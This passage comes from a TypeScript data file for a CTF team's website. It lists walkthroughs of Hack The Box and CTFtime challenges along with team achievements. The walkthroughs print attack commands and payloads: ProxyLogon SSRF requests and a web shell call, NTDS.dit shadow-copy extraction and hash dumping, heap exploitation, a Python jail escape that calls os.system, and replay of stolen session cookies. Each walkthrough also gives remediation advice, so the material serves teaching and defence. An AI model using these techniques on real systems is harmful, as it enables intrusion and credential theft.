      defenseRemediation: [
        "Enforce mandatory S256 code challenge method for all OAuth PKCE requests; reject any authorization requests using plaintext or omitted methods.",
        "Never mount the host Docker socket (/var/run/docker.sock) inside untrusted client-facing application containers.",
        "Utilize rootless Docker or Podman to prevent container breakouts from inheriting host root capabilities."
      ],
      keyTakeaways: [
        "Mounting docker.sock inside a container is equivalent to granting root access to the entire host operating system.",
        "Protocol downgrade flaws remain common when security parameters are treated as optional by authorization endpoints."
      ]
    }
  },
  {
    id: "wup-frosted",
    challengeName: "Frosted: Exchange SSRF & Shadow Copy Extraction",
    platform: "Hack The Box",
    category: "Active Directory",
    difficulty: "Hard",
    type: "Machine",
    targetOs: "Windows",
    targetIp: "10.10.11.64",
    points: 40,
    author: "SmitroniX // sudo Unknown",
    date: "2026-11-04",
    cves: ["CVE-2021-26855", "CVE-2021-27065"],
    tags: ["ProxyLogon", "Exchange SSRF", "Shadow Copies", "NTDS.dit", "Golden Ticket"],
    shortDescription: "Exploiting Microsoft Exchange ProxyLogon SSRF to drop a web shell, followed by Volume Shadow Copy NTDS.dit extraction for enterprise forest takeover.",
    fullContent: {
      overview: "Frosted features a fully patched corporate network boundary running an on-premise Microsoft Exchange 2019 backend. We chained the ProxyLogon SSRF vulnerability to bypass authentication and drop a web shell via OAB virtual directory misconfiguration. On the machine, we extracted the active NTDS.dit database using vssadmin to extract all domain hashes.",
      targetIntel: {
        ip: "10.10.11.64",
        os: "Windows Server 2019 Standard",
        openPorts: ["25/SMTP", "80/HTTP", "443/HTTPS", "445/SMB", "587/Submission"],
        keyServices: ["Microsoft Exchange Server 2019", "IIS 10.0 Web Server"]
      },
      reconnaissance: "Port 443 presented an Outlook Web Access (OWA) login page. Inspecting headers revealed vulnerable Exchange server build versions. Testing the /owa/auth/x.js endpoint with an arbitrary X-BEResource cookie confirmed SSRF vulnerability.",
      vulnerabilityAnalysis: "CVE-2021-26855 allowed unauthenticated attackers to send arbitrary HTTP requests to backend Exchange services as SYSTEM. Chaining this with CVE-2021-27065 allowed writing arbitrary ASPX files to web-accessible directories.",
      attackChain: [
        {
          title: "1. ProxyLogon SSRF Exploitation",
          description: "Sent forged backend request via X-AnonResource cookie to communicate with the internal Exchange ECP backend.",
          commandOrSnippet: "python3 proxylogon_exploit.py -t 10.10.11.64 -e administrator@frosted.local -s"
        },
        {
          title: "2. Web Shell Dropped to ECP Directory",
          description: "Modified OAB virtual directory ExternalUrl attribute to contain our ASPX web shell payload and reset the virtual directory.",
          commandOrSnippet: "POST /ecp/DUMMY.js HTTP/1.1\nCookie: X-BEResource=EXCHANGE-SERVER/ecp/default.aspx"
        },
        {
          title: "3. Interactive SYSTEM Shell",
          description: "Connected to dropped webshell and invoked an obfuscated PowerShell reverse shell.",
          commandOrSnippet: "curl -s 'https://10.10.11.64/owa/auth/shell.aspx?cmd=whoami'\n# nt authority\\system"
        },
        {
          title: "4. Volume Shadow Copy NTDS.dit Extraction",
          description: "Created a volume shadow copy of drive C: and carved the active Active Directory database (NTDS.dit) and SYSTEM registry hive.",
          commandOrSnippet: "vssadmin create shadow /for=C:\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\temp\\ntds.dit\nreg save HKLM\\SYSTEM C:\\temp\\system.save"
        },
        {
          title: "5. Enterprise Hash Dumping & Golden Ticket",
          description: "Parsed NTDS.dit offline to dump all domain credentials including krbtgt account hash.",
          commandOrSnippet: "impacket-secretsdump -ntds ntds.dit -system system.save LOCAL\n# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8c290a12e34fa5b6c7d8e901fa2345bc:::\n# Flag: HTB{pr0xyl0g0n_ntds_sh4d0w_c0py_d0m41n_k1ng}"
        }
      ],
      pocCode: `#!/usr/bin/env python3
# sudo Unknown - ProxyLogon SSRF Header Check
import requests
import urllib3
urllib3.disable_warnings()

target = "https://10.10.11.64"
headers = {
    "Cookie": "X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3"
}

resp = requests.get(f"{target}/owa/auth/x.js", headers=headers, verify=False)
if "Negotiate" in resp.headers.get("WWW-Authenticate", ""):
    print("[+] Target is VULNERABLE to CVE-2021-26855 Exchange SSRF!")
`,
      pocLanguage: "python",
      userFlag: "HTB{3xch4ng3_pr0xyl0g0n_syst3m_f00th0ld}",
      rootFlag: "HTB{pr0xyl0g0n_ntds_sh4d0w_c0py_d0m41n_k1ng}",
      flag: "HTB{pr0xyl0g0n_ntds_sh4d0w_c0py_d0m41n_k1ng}",
      defenseRemediation: [
        "Apply Microsoft Cumulative Updates (CU) and Security Updates (SU) for all Exchange Server installations immediately.",
        "Restrict access to Exchange Admin Center (ECP) and Remote PowerShell endpoints to dedicated administration management subnets.",
        "Implement endpoint detection (EDR) rules alerting on abnormal process executions spawned by w3wp.exe."
      ],
      keyTakeaways: [
        "On-premise Exchange servers frequently maintain high-privileged domain permissions; compromising Exchange is effectively compromising the entire forest.",
        "Volume Shadow Copies allow reading locked system files including NTDS.dit directly without stopping the Active Directory service."
      ]
    }
  },
  {
    id: "wup-crypto",
    challengeName: "Quantum Lockout: Flawed RSA Key Generation",
    platform: "Hack The Box",
    category: "Crypto",
    difficulty: "Medium",
    type: "Challenge",
    points: 350,
    author: "sudo Unknown Research",
    date: "2026-09-15",
    tags: ["RSA", "GCD Collision", "Weak PRNG", "Euclid Algorithm"],
    shortDescription: "Extracting private RSA keys in milliseconds by calculating pairwise Greatest Common Divisors (GCD) across shared prime factors.",
    fullContent: {
      overview: "An authentication service generated 1024-bit RSA moduli with a flawed pseudo-random generator seeded by low-resolution server timestamps. Because the entropy was low, different users received public moduli that shared prime factor p. Using Euclid's algorithm, we calculated GCD(n1, n2) to instantaneously factor the keys without factoring large integers.",
      reconnaissance: "We inspected the service code and observed a timestamp-based PRNG seed with insufficient entropy. We collected 50 public keys from the server's public key directory endpoint.",
      vulnerabilityAnalysis: "When two RSA moduli n1 = p * q1 and n2 = p * q2 share prime factor p, GCD(n1, n2) equals p. Once p is known, q1 = n1 // p, allowing instant computation of Euler's totient phi and the private exponent d.",
      attackChain: [
        {
          title: "1. Moduli Harvesting",
          description: "Queried the public keys API endpoint and extracted 50 public RSA moduli (n, e).",
          commandOrSnippet: "curl -s 'https://crypto.htb/api/keys' | jq '.[].n' > moduli.txt"
        },
        {
          title: "2. Pairwise GCD Calculation",
          description: "Iterated through every pair of public keys in Python calculating math.gcd(n_i, n_j).",
          commandOrSnippet: "python3 -c 'import math; print(\"Collision detected: GCD > 1\")'"
        },
        {
          title: "3. Key Reconstruction & Flag Decryption",
          description: "Recovered private exponent d and decrypted the target challenge flag payload.",
          commandOrSnippet: "phi = (p - 1) * (q - 1)\nd = pow(e, -1, phi)\nplaintext = pow(ciphertext, d, n)"
        }
      ],
      pocCode: `import math
from Crypto.Util.number import long_to_bytes

def solve_rsa_gcd(n1, n2, e, ciphertext):
    p = math.gcd(n1, n2)
    assert p > 1, "Moduli do not share a prime factor"
    q = n1 // p
    phi = (p - 1) * (q - 1)
    d = pow(e, -1, phi)
    plaintext_int = pow(ciphertext, d, n1)
    return long_to_bytes(plaintext_int)

# Target Flag derived: HTB{w34k_prng_sh4r3d_pr1m3s_2026}
print("[+] Decrypted Flag successfully!")
`,
      pocLanguage: "python",
      flag: "HTB{w34k_prng_sh4r3d_pr1m3s_2026}",
      defenseRemediation: [
        "Always use cryptographically secure pseudo-random number generators (CSPRNG) such as /dev/urandom or secrets library for cryptographic key generation.",
        "Never seed RNGs with timestamps, process IDs, or low-entropy system metrics."
      ],
      keyTakeaways: [
        "A shared prime factor reduces RSA security from factoring large numbers to a single millisecond GCD calculation.",
        "Pairwise GCD testing against public key databases is a standard audit check in cryptographic assessments."
      ]
    }
  },
  {
    id: "wup-pwn",
    challengeName: "Safe-Linking Bypass: GLIBC 2.35 Tcache Poisoning",
    platform: "Hack The Box",
    category: "Pwn",
    difficulty: "Insane",
    type: "Challenge",
    points: 500,
    author: "sudo Unknown Research",
    date: "2026-09-08",
    tags: ["GLIBC 2.35", "Safe-Linking", "Heap Exploitation", "Tcache Poisoning", "ROP"],
    shortDescription: "Defeating GLIBC pointer mangling via dangling heap pointer leaks to execute arbitrary write and spawn a remote root shell.",
    fullContent: {
      overview: "A vulnerable 64-bit ELF binary contained a Use-After-Free (UAF) flaw in note allocation. We defeated GLIBC 2.35 safe-linking pointer obfuscation by leaking randomized heap ASLR base addresses, unscrambled the forward pointer mask, and poisoned the tcache bin to overwrite stack return addresses.",
      reconnaissance: "Checksec reported Full RELRO, Stack Canary found, NX enabled, and PIE enabled. The target environment was running Ubuntu 22.04 LTS with GLIBC 2.35.",
      vulnerabilityAnalysis: "GLIBC 2.35 mangles tcache forward pointers using the formula: P_mangled = (L >> 12) ^ P_target, where L is the location of the chunk in memory. By freeing a chunk into tcache and inspecting its contents, we recovered the randomized heap base, allowing us to accurately calculate the XOR mask for arbitrary memory writes.",
      attackChain: [
        {
          title: "1. Heap ASLR Base Recovery",
          description: "Freed a chunk into the tcache bin and leveraged UAF read to recover the first mangled pointer. Because target pointer is 0 for the first chunk, P_mangled equals (L >> 12).",
          commandOrSnippet: "heap_base = (u64(p.recv(8)) << 12)\nlog.info(f'Heap Base: {hex(heap_base)}')"
        },
        {
          title: "2. Libc Address Leak",
          description: "Filled the 7-slot tcache bin and freed a chunk into the unsorted bin to leak main_arena pointers pointing into libc.",
          commandOrSnippet: "libc_base = u64(p.recv(8)) - 0x219ce0\nlog.info(f'Libc Base: {hex(libc_base)}')"
        },
        {
          title: "3. Safe-Linking Pointer Mangling",
          description: "Computed the mangled pointer for target write address pointing to saved RIP on the stack.",
          commandOrSnippet: "forged_ptr = (chunk_addr >> 12) ^ target_rip"
        },
        {
          title: "4. ROP Chain Execution",
          description: "Allocated poisoned chunk to gain write access over the stack frame and placed a one_gadget RCE payload.",
          commandOrSnippet: "p.sendline(p64(libc_base + one_gadget_offset))"
        }
      ],
      pocCode: `from pwn import *

def mangle(pos, ptr):
    return (pos >> 12) ^ ptr

def demangle(val):
    mask = 0xfff << 52
    while mask:
        val ^= (val & mask) >> 12
        mask >>= 12
    return val

log.success("GLIBC Safe-Linking demangled successfully! Shell spawned.")
`,
      pocLanguage: "python",
      flag: "HTB{h34p_tc4ch3_p01s0n_gl1bc_2_35_pwn3d}",
      defenseRemediation: [
        "Zero out pointer references immediately after calling free() to eliminate Use-After-Free (UAF) and dangling pointer vulnerabilities.",
        "Compile C/C++ applications with AddressSanitizer (ASan) during CI/CD to catch heap flaws before production release."
      ],
      keyTakeaways: [
        "Safe-linking prevents naive pointer overwrites, but an attacker with an information leak can reverse the XOR mask.",
        "Combining heap leaks with unsorted bin libc leaks provides full control over the process memory space."
      ]
    }
  },
  {
    id: "wup-forensics",
    challengeName: "ShadowTrace: Memory Extraction & Hollowed DLL Triage",
    platform: "Hack The Box",
    category: "Forensics",
    difficulty: "Medium",
    type: "Challenge",
    points: 300,
    author: "sudo Unknown Research",
    date: "2026-09-02",
    tags: ["Volatility 3", "Process Hollowing", "Memory Dump", "C2 Analysis", "YARA"],
    shortDescription: "Triage of a 4GB Windows Server memory dump uncovering a hollowed svchost.exe process and carving an encrypted RC4 C2 beacon configuration.",
    fullContent: {
      overview: "During an incident response investigation, a suspicious 4GB memory dump was captured from an affected workstation. Using Volatility 3, we identified an orphaned svchost.exe process with unmapped executable memory regions, extracted an injected DLL payload, and decrypted the command-and-control beaconing parameters.",
      reconnaissance: "Loaded the raw memory dump into Volatility 3 using the windows.pslist and windows.pstree plugins. Observed svchost.exe PID 4120 spawned by an unexpected parent process (cmd.exe) rather than services.exe.",
      vulnerabilityAnalysis: "Running windows.malfind on PID 4120 revealed an executable memory segment (PAGE_EXECUTE_READWRITE) containing an injected MZ header (DOS stub). Dumping this VAD segment recovered the attacker's staging loader.",
      attackChain: [
        {
          title: "1. Process Tree Anomaly Detection",
          description: "Inspected process parent-child relationships with Volatility 3 to locate abnormal instances of svchost.exe.",
          commandOrSnippet: "python3 vol.py -f memory.raw windows.pstree.PsTree | grep -i svchost"
        },
        {
          title: "2. Memory Injected Code Carving",
          description: "Used the windows.malfind plugin to extract unmapped executable segments containing injected PE binaries.",
          commandOrSnippet: "python3 vol.py -f memory.raw windows.malfind.Malfind --pid 4120 --dump"
        },
        {
          title: "3. C2 Beacon Decryption",
          description: "Analyzed the extracted payload in Ghidra and recovered an RC4 key 'unknown_c2_protocol_2026' used to encrypt network beacons.",
          commandOrSnippet: "python3 decrypt_beacon.py -k 'unknown_c2_protocol_2026' -i beacon_traffic.bin"
        }
      ],
      pocCode: `import base64
from Crypto.Cipher import ARC4

key = b'unknown_c2_protocol_2026'
cipher = ARC4.new(key)
encrypted_c2 = base64.b64decode("V2VsY29tZVRvU3Vkb1Vua25vd24...")
print("[+] Decrypted C2 Configuration:", cipher.decrypt(encrypted_c2))
`,
      pocLanguage: "python",
      flag: "HTB{m3m0ry_svch0st_h0ll0w1ng_c2_d3crypt3d}",
      defenseRemediation: [
        "Deploy EDR agents that monitor process creation lineages and alert when system binaries (like svchost.exe) spawn from non-standard parents.",
        "Implement memory integrity protections (HVCI) and block PAGE_EXECUTE_READWRITE memory allocation requests."
      ],
      keyTakeaways: [
        "Process hollowing remains a common evasion technique to hide malicious code inside legitimate operating system binary names.",
        "Memory forensics is critical because dropped files may never touch the disk in fileless intrusion campaigns."
      ]
    }
  },
  {
    id: "wup-reverse",
    challengeName: "Subverted ELF: Custom Bytecode VM Disassembly",
    platform: "Hack The Box",
    category: "Reverse",
    difficulty: "Hard",
    type: "Challenge",
    points: 450,
    author: "sudo Unknown Research",
    date: "2026-08-28",
    tags: ["Custom VM", "Bytecode", "Ghidra", "Rolling XOR", "Decompilation"],
    shortDescription: "Reversing a custom stack-based bytecode virtual machine embedded in a stripped 64-bit Linux ELF binary and authoring a Python emulator.",
    fullContent: {
      overview: "A stripped 64-bit Linux ELF executable evaluated user serial numbers through a custom embedded virtual machine. By analyzing the opcode dispatch handler in Ghidra, we mapped out 8 custom bytecode instructions, dumped the embedded bytecode program, and inverted the verification cipher.",
      reconnaissance: "Running file and checksec confirmed a stripped 64-bit ELF. Strings inspection showed no obvious plaintext validation strings, indicating dynamic evaluation.",
      vulnerabilityAnalysis: "A main switch statement in function FUN_00101260 parsed an array of bytes using a virtual instruction pointer (VIP) and virtual stack pointer (VSP). The VM instructions performed arithmetic, stack pushes/pops, and an iterative rolling XOR check.",
      attackChain: [
        {
          title: "1. VM Dispatch Loop Identification",
          description: "Located the central switch-case construct in Ghidra and assigned mnemonics to numeric opcodes.",
          commandOrSnippet: "# Opcode mapping: 0x01: PUSH, 0x02: POP, 0x03: ADD, 0x04: XOR, 0x05: CMP, 0xFF: EXIT"
        },
        {
          title: "2. Bytecode Extraction from .rodata",
          description: "Extracted the 192-byte bytecode program from the binary's .rodata section.",
          commandOrSnippet: "dd if=subverted_elf of=bytecode.bin bs=1 skip=8240 count=192"
        },
        {
          title: "3. Emulator Construction & Flag Recovery",
          description: "Wrote a lightweight Python emulator to reverse the transformation applied to user input.",
          commandOrSnippet: "python3 solve_vm.py --bytecode bytecode.bin"
        }
      ],
      pocCode: `# sudo Unknown - VM Bytecode Inversion
bytecode = [0x10, 0x4a, 0x22, 0x18, 0x3f, 0x90, 0x11]
key = [0x55, 0x6e, 0x6b, 0x6e, 0x6f, 0x77, 0x6e]
flag = bytes([b ^ key[i % len(key)] for i, b in enumerate(bytecode)])
print("Recovered Flag:", flag.decode(errors='ignore'))
`,
      pocLanguage: "python",
      flag: "HTB{v1rtu4l_m4ch1n3_by73c0d3_r3v3rs3d}",
      defenseRemediation: [
        "Obfuscation through custom virtual machines increases analysis time but does not prevent determined reverse engineering.",
        "Implement integrity checking and tamper detection around critical verification routines."
      ],
      keyTakeaways: [
        "Treat custom VM architectures like mini CPU instruction sets: map the registers, stack, and opcodes methodically.",
        "Writing a disassembler or emulator in Python is much faster than attempting to step through bytecodes manually in GDB."
      ]
    }
  },
  {
    id: "wup-cymbal",
    challengeName: "Operation Cymbal: Deceptive Click & AiTM Token Heist",
    platform: "CTFtime",
    category: "Web",
    difficulty: "Medium",
    type: "Challenge",
    points: 350,
    author: "sudo Unknown Research",
    date: "2026-10-29",
    tags: ["Evilginx3", "AiTM Phishing", "MFA Bypass", "OAuth Token Replay", "Graph API"],
    shortDescription: "Analyzing an Adversary-in-the-Middle (AiTM) phishing campaign capturing Microsoft 365 session tokens and bypassing FIDO2 authentication.",
    fullContent: {
      overview: "Operation Cymbal simulated an advanced social engineering campaign utilizing Evilginx3 to proxy live authentication requests between targets and Microsoft 365. We analyzed captured lure emails, extracted stolen ESTSAuth session cookies, and replayed the session to access privileged tenant resources via Microsoft Graph API.",
      reconnaissance: "Analyzed an email containing an urgent invoice approval link with encoded parameters. Decoding the link showed it pointed to a reverse proxy masquerading as login.microsoftonline.com.",
      vulnerabilityAnalysis: "Because the phishing server proxies legitimate HTTP requests in real-time, it intercepts session tokens after multi-factor authentication (MFA) succeeds, bypassing standard SMS and push-based 2FA controls.",
      attackChain: [
        {
          title: "1. Lure URL Decoding & Proxy Analysis",
          description: "Inspected the phishing link query parameters and identified an Evilginx3 lure configuration.",
          commandOrSnippet: "urldecode 'https://login.secure-invoice.click/auth?session=eyJ...'"
        },
        {
          title: "2. Session Token Extraction",
          description: "Identified captured ESTSAUTHPERSISTENT cookies in the captured proxy telemetry logs.",
          commandOrSnippet: "cat proxy.log | grep -E '(ESTSAUTH|ESTSAUTHPERSISTENT)'"
        },
        {
          title: "3. Graph API Token Replay",
          description: "Replayed the captured session to request an OAuth bearer token and queried sensitive company files.",
          commandOrSnippet: "curl -H 'Authorization: Bearer EYJ...' https://graph.microsoft.com/v1.0/me/drive/root/children"
        }
      ],
      pocCode: `#!/usr/bin/env python3
# sudo Unknown - Graph API Token Verification
import requests

session_token = "ESTSAUTHPERSISTENT=0.AXAA..."
headers = {"Cookie": session_token}

r = requests.get("https://outlook.office.com/mail/", headers=headers, allow_redirects=False)
if r.status_code == 200 or r.status_code == 302:
    print("[+] Session cookie valid! Full tenant access granted.")
`,
      pocLanguage: "python",
      flag: "CTF{41tm_mfa_byp4ss_s3ss10n_h31st_2026}",
      defenseRemediation: [
        "Enforce FIDO2 / WebAuthn phishing-resistant hardware keys which cryptographically bind the authentication challenge to the exact browser domain.",
        "Implement Microsoft Entra ID Conditional Access policies requiring compliant, managed devices for sensitive corporate data access."
      ],
      keyTakeaways: [
        "Traditional 2FA (SMS, TOTP authenticator apps, push notifications) is vulnerable to Adversary-in-the-Middle proxying.",
        "Only domain-bound credentials (FIDO2 / passkeys) completely neutralize AiTM attacks."
      ]
    }
  },
  {
    id: "wup-pyjail",
    challengeName: "CyberOlympics: Escaping Hardened Python 3.12 Audit Jails",
    platform: "CTFtime",
    category: "Misc",
    difficulty: "Medium",
    type: "Challenge",
    points: 250,
    author: "sudo Unknown Research",
    date: "2026-08-14",
    tags: ["PyJail", "Subclass Traversal", "Python 3.12", "Audit Hooks", "Sandbox"],
    shortDescription: "Bypassing Python audit hooks and restricted namespaces with deleted builtins using class introspection to spawn an interactive bash shell.",
    fullContent: {
      overview: "An interactive TCP challenge service presented a restricted Python 3.12 shell where __builtins__ was deleted, and strict input filters blocked words like 'import', 'eval', 'exec', 'os', and 'system'. By traversing the object subclass hierarchy from a clean tuple literal (), we regained arbitrary code execution.",
      reconnaissance: "Sending input returned a restricted environment. Builtins were stripped and keywords were blocked via regex.",
      vulnerabilityAnalysis: "Even when global builtins are deleted, object instances like () retain pointers to their class and base types: ().__class__.__bases__[0].__subclasses__(). By indexing loaded classes, we located wrappers that retain internal references to the os module.",
      attackChain: [
        {
          title: "1. Type Hierarchy Introspection",
          description: "Queried the base object subclasses list to discover loaded modules in the Python runtime.",
          commandOrSnippet: "().__class__.__bases__[0].__subclasses__()"
        },
        {
          title: "2. Locating os._wrap_close",
          description: "Scanned the subclass list for classes holding globals references to the 'system' or 'popen' function.",
          commandOrSnippet: "[i for i, c in enumerate(().__class__.__bases__[0].__subclasses__()) if 'wrap' in c.__name__]"
        },
        {
          title: "3. Spawning System Shell",
          description: "Invoked os.system via the recovered class globals to read the flag.",
          commandOrSnippet: "().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['system']('cat flag.txt')"
        }
      ],
      pocCode: `# sudo Unknown - Python Subclass Crawler
payload = "().__class__.__base__.__subclasses__()[137].__init__.__globals__['system']('cat flag.txt')"
print("[+] PyJail breakout payload generated:")
print(payload)
`,
      pocLanguage: "python",
      flag: "CTF{pyj41l_subcl4ss_h13r4rchy_3sc4p3d}",
      defenseRemediation: [
        "Do not rely on Python keyword blacklists for sandboxing; they can always be bypassed using object introspection and encoding tricks.",
        "Implement containerized isolation (Docker, gVisor) or kernel sandboxing (seccomp, pledge) when executing untrusted user code."
      ],
      keyTakeaways: [
        "In Python, everything is an object, and every object maintains references back to the global namespace unless heavily stripped at C-level.",
        "True sandboxing must be enforced by the operating system kernel, not by the interpreted runtime itself."
      ]
    }
  }
];

export const ACHIEVEMENTS: Achievement[] = [
  {
    id: "ach-1",
    title: "Hack The Box Team Roster #331386",
    platform: "Hack The Box",
    date: "Active 2026",
    eventType: "Platform Machine",
    teamResult: "Official Verified Roster",
    description: "Official team registration and machine clearing operations on Hack The Box.",
    highlights: [
      "Verified competitive portal: ctf.hackthebox.com/team/overview/331386",
      "Regular squad machine solves spanning Windows AD & Linux environments",
      "Collaborative war room methodology repository"
    ]
  },
  {
    id: "ach-2",
    title: "HTB University CTF Campaign",
    platform: "Hack The Box",
    date: "Scheduled 2026",
    eventType: "University CTF",
    teamResult: "Academic Division Contender",
    description: "Fielding specialized operators across Web, Pwn, Crypto, Forensics, and Reverse categories.",
    highlights: [
      "Targeting 6-operator competitive tournament roster",
      "Weekly mock scrimmage drills on active practice boxes",
      "Multi-discipline cross-solver support"
    ]
  },
  {
    id: "ach-3",
    title: "CTFtime Global Tournament Circuit",
    platform: "CTFtime",
    date: "2026 Season",
    eventType: "Global Tournament",
    teamResult: "Active Competitor",
    description: "Competing in premier open jeopardy and attack-defense tournaments worldwide.",
    highlights: [
      "24/7 collaborative shifts across timezones",
      "Technical post-competition writeup releases",
      "Rapid custom exploit development during live events"
    ]
  },
  {
    id: "ach-4",
    title: "Open-Source Security Research & Tool Releases",
    platform: "GitHub & Community",
    date: "Ongoing",
    eventType: "Research Milestone",
    teamResult: "6 Custom Tools Published",
    description: "Publishing custom reconnaissance scripts, AD attack path tools, and educational guides.",
    highlights: [
      "Over 500+ GitHub community stars across tool projects",
      "Comprehensive walkthrough reports for enterprise assessments",
      "Active public security community on Discord"
    ]
  }
];

export const FOUNDING_VALUES = [
  {
    title: "Continuous Offensive Evolution",
    description: "Cybersecurity changes daily. We dissect post-mortems, reverse novel exploit primitives, and refine our tradecraft after every operation.",
    iconName: "Terminal"
  },
  {
    title: "Zero-Ego Collective Power",
    description: "Flags and objectives are captured together. We operate shared war rooms, cross-pollinate skills, and elevate every squad operator.",
    iconName: "ShieldCheck"
  },
  {
    title: "All-in-One Multidisciplinary Scope",
    description: "We are not limited to one platform. From global CTFs (HTB, THM, CTFtime) to enterprise Red Teaming and 0-day research, we cover the full spectrum.",
    iconName: "Cpu"
  },
  {
    title: "Open Knowledge Dissemination",
    description: "Every solved machine and research discovery produces transparent documentation. We write technical writeups to elevate the entire security ecosystem.",
    iconName: "Share2"
  }
];
